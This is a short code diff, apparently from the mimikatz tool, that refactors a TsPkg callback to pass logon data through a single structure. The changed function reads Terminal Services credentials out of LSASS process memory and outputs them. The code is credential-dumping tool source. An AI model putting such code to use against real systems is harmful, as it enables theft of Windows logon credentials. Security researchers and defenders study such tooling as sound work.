@@ -28,19 +28,19 @@ NTSTATUS kuhl_m_sekurlsa_tspkg(int argc, wchar_t * argv[])
 	return kuhl_m_sekurlsa_getLogonData(kuhl_m_sekurlsa_tspkg_single_package, 1, NULL, NULL);
 }
 
-void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_tspkg(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PLUID logId, IN PVOID pCredentials, IN OPTIONAL PKUHL_M_SEKURLSA_EXTERNAL externalCallback, IN OPTIONAL LPVOID externalCallbackData)
+void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_tspkg(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL PKUHL_M_SEKURLSA_EXTERNAL externalCallback, IN OPTIONAL LPVOID externalCallbackData)
 {
 	KIWI_TS_CREDENTIAL credentials;
 	KIWI_TS_PRIMARY_CREDENTIAL primaryCredential;
 
 	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aLocalMemory = {&credentials, &hLocalMemory}, aLsassMemory = {NULL, cLsass->hLsassMem};
+	KULL_M_MEMORY_ADDRESS aLocalMemory = {&credentials, &hLocalMemory}, aLsassMemory = {NULL, pData->cLsass->hLsassMem};
 	PVOID buffer = NULL;
 
-	if(kuhl_m_sekurlsa_tspkg_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(cLsass, &kuhl_m_sekurlsa_tspkg_package.Module, TsPkgReferences, sizeof(TsPkgReferences) / sizeof(KULL_M_PATCH_GENERIC), (PVOID *) &TSGlobalCredTable, NULL, NULL))
+	if(kuhl_m_sekurlsa_tspkg_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_tspkg_package.Module, TsPkgReferences, sizeof(TsPkgReferences) / sizeof(KULL_M_PATCH_GENERIC), (PVOID *) &TSGlobalCredTable, NULL, NULL))
 	{
 		aLsassMemory.address = TSGlobalCredTable;
-		if(aLsassMemory.address = kuhl_m_sekurlsa_utils_pFromAVLByLuid(&aLsassMemory, FIELD_OFFSET(KIWI_TS_CREDENTIAL, LocallyUniqueIdentifier), logId))
+		if(aLsassMemory.address = kuhl_m_sekurlsa_utils_pFromAVLByLuid(&aLsassMemory, FIELD_OFFSET(KIWI_TS_CREDENTIAL, LocallyUniqueIdentifier), pData->LogonId))
 		{
 			if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_TS_CREDENTIAL)))
 			{
@@ -48,7 +48,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_tspkg(IN PKUHL_M_SEKURLSA_CONT
 				{
 					aLocalMemory.address = &primaryCredential;
 					if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_TS_PRIMARY_CREDENTIAL)))
-						kuhl_m_sekurlsa_genericCredsOutput(&primaryCredential.credentials, logId, KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN, externalCallback, externalCallbackData);
+						kuhl_m_sekurlsa_genericCredsOutput(&primaryCredential.credentials, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN, externalCallback, externalCallbackData);
 				}
 			}
 		}
